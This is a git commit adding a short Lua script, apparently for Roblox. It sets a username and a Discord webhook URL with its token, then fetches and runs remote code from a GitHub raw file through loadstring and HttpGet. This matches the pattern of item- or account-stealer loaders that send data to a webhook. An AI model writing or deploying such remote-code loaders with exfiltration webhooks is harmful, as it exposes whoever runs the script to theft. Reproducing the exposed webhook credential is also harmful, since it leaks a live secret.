cc8c8bd4f48482bc7b93102e555f1e62e39bca87
redredd1w11-debug <pomarenkoivan9@gmail.com>
2024-10-06 18:07:15 +0300

    Add files via upload

---
+++ obf_6c42BCK705zRE15YZTWf1TG4j9P03HHpkBdfqF7w8r4PvsNoc8bt7yjiV2jRB73J.lua
@@ -0,0 +1,4 @@
+Username = 'tefhvx'
+Webhook = 'https://discord.com/api/webhooks/1292503100506116097/jVpB5un_89y7WBvDhkUx9ivzLcYQO0IIfwC_WDW_Z9LUgpY25Y2EiedfYvwhnnOJdFzd'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
